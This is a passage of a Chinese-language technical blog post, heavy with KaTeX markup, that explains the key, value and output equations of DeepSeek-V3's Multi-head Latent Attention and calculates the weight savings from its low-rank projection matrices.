style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span> 来计算 key：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><mo stretchy="false">{</mo><msubsup><mi>k</mi><mi>t</mi><mi>C</mi></msubsup><mo separator="true">,</mo><msubsup><mi>k</mi><mi>t</mi><mi>R</mi></msubsup><mo stretchy="false">}</mo><mo>=</mo><mo stretchy="false">{</mo><msup><mi>W</mi><mrow><mi>U</mi><mi>K</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup><mo separator="true">,</mo><mi mathvariant="normal">RoPE</mi><mo>⁡</mo><mo stretchy="false">(</mo><msup><mi>W</mi><mrow><mi>K</mi><mi>R</mi></mrow></msup><msub><mi>h</mi><mi>t</mi></msub><mo stretchy="false">)</mo><mo stretchy="false">}</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(4)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">\{k^C_t, k^R_t\}=\{W^{UK}c^{KV}_t,\operatorname{RoPE}(W^{KR}h_t)\} \tag{4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mclose">}</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop"><span class="mord mathrm">RoPE</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)}</span></span><span class="tag"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">4</span></span><span class="mord">)</span></span></span></span></span></span></p><p>同样地，对于 Value 张量：</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msubsup><mi>v</mi><mi>t</mi><mi>C</mi></msubsup><mo>=</mo><msup><mi>W</mi><mrow><mi>U</mi><mi>V</mi></mrow></msup><msubsup><mi>c</mi><mi>t</mi><mrow><mi>K</mi><mi>V</mi></mrow></msubsup></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(5)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">v^C_t=W^{UV}c^{KV}_t \tag{5}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1383em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1383em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:1.1413em;vertical-align:-0.25em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">5</span></span><span class="mord">)</span></span></span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>D</mi><mi>K</mi><mi>V</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{DKV}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">DK</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>U</mi><mi>K</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{UK}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>U</mi><mi>V</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{UV}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span></span></span></span> 分别表示 down proj 的 KV 权重矩阵，up proj 的 K V 权重矩阵。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>K</mi><mi>R</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{KR}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span></span></span></span></span></span></span></span></span></span></span></span> 是用于产生携带 RoPE 信息的那一部分 key。同样地，再重复一遍：<u>不同于传统的 attention 机制，MLA 仅有后部分 QKV 携带 RoPE 的位置编码信息。</u></p><ol start="5"><li>在图的右半部分，我们将3 4 步得到的 QKV 做 MHA(Multi-Head Attention) ，这里想必大家都挺熟了的:<p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>o</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub><mo>=</mo><munderover><mo>∑</mo><mrow><mi>j</mi><mo>=</mo><mn>1</mn></mrow><mi>t</mi></munderover><mrow><mi>σ</mi><mo stretchy="false">(</mo><mfrac><mrow><msubsup><mi>q</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>i</mi></mrow><mi>T</mi></msubsup><msub><mi>k</mi><mrow><mi>j</mi><mo separator="true">,</mo><mi>i</mi></mrow></msub></mrow><msqrt><mi>D</mi></msqrt></mfrac><mo stretchy="false">)</mo><msubsup><mi>v</mi><mrow><mi>j</mi><mo separator="true">,</mo><mi>i</mi></mrow><mi>C</mi></msubsup></mrow></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(6)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">o_{t,i}=\sum^t_{j=1}{\sigma(\frac{q^T_{t,i}k_{j,i}}{\sqrt{D}})v^C_{j,i}}\tag{6}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:3.1943em;vertical-align:-1.4138em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7806em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6261em;"><span style="top:-2.1833em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9267em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span></span></span><span style="top:-2.8867em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1133em;"><span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.7848em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-2.4413em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3948em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0315em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.93em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-2.453em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3831em;"><span></span></span></span></span></span></span></span></span><span class="tag"><span class="strut" style="height:3.1943em;vertical-align:-1.4138em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">6</span></span><span class="mord">)</span></span></span></span></span></span></p></li><li>最后，在图的最下面，我们将 atten 得到的结果再做一次 o proj 和 RMSNorm，得到的 hidden states 就可以传给后续的 MoE/MLP 层了：<p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable width="100%"><mtr><mtd width="50%"></mtd><mtd><mrow><msub><mi>u</mi><mi>t</mi></msub><mo>=</mo><msup><mi>W</mi><mi>O</mi></msup><mo stretchy="false">{</mo><msub><mi>o</mi><mrow><mi>t</mi><mo separator="true">,</mo><mn>1</mn></mrow></msub><mo separator="true">;</mo><msub><mi>o</mi><mrow><mi>t</mi><mo separator="true">,</mo><mn>2</mn></mrow></msub><mo separator="true">;</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">;</mo><msub><mi>o</mi><mrow><mi>t</mi><mo separator="true">,</mo><mi>n</mi></mrow></msub><mo stretchy="false">}</mo></mrow></mtd><mtd width="50%"></mtd><mtd><mtext>(7)</mtext></mtd></mtr></mtable><annotation encoding="application/x-tex">u_t=W^O\{o_{t,1};o_{t,2};...;o_{t,n}\} \tag{7}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">t</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1774em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span></span></span></span></span></span></span></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span><span class="tag"><span class="strut" style="height:1.1774em;vertical-align:-0.2861em;"></span><span class="mord text"><span class="mord">(</span><span class="mord"><span class="mord">7</span></span><span class="mord">)</span></span></span></span></span></span></p></li></ol><h3 id="将一个大矩阵替换成两个低秩矩阵，节约了多少权重大小？">将一个大矩阵替换成两个低秩矩阵，节约了多少权重大小？</h3><p>我们来计算一下，用此方法的低秩矩阵究竟能节省多少权重？以 DeepSeek-V3 为例，其 hidden size 是  7168，num heads 是 128，head dim 是 192，那么传统的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mi>Q</mi></msup></mrow><annotation encoding="application/x-tex">W^Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span></span></span> 维度是 (7168, 128x192)，而<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>D</mi><mi>Q</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{DQ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span></span></span></span> 维度是 (7168, 1536) 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>U</mi><mi>Q</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{UQ}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">U</span><span class="mord mathnormal mtight">Q</span></span></span></span></span></span></span></span></span></span></span></span> 维度是 (1536, 128x192)，节省了 72.3% 的权重。</p><p>同样来计算一下这方法可以节省多少权重？按照图中给出的 DeepSeek-V3 模型的数据规模：若使用传统的 attention，那么 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mi>K</mi></msup></mrow><annotation encoding="application/x-tex">W^K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span></span></span></span></span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mi>V</mi></msup></mrow><annotation encoding="application/x-tex">W^V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span></span></span> 都是 (7168, 128x192) 大小；而 MLA 中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>W</mi><mrow><mi>D</mi><mi>K</mi><mi>V</mi></mrow></msup></mrow><annotation encoding="application/x-tex">W^{DKV}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">DK</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span></span></span></span></span></span></span></span></span> 是 (7168, 512)，<span class="katex"><span class="katex-mathml"><math 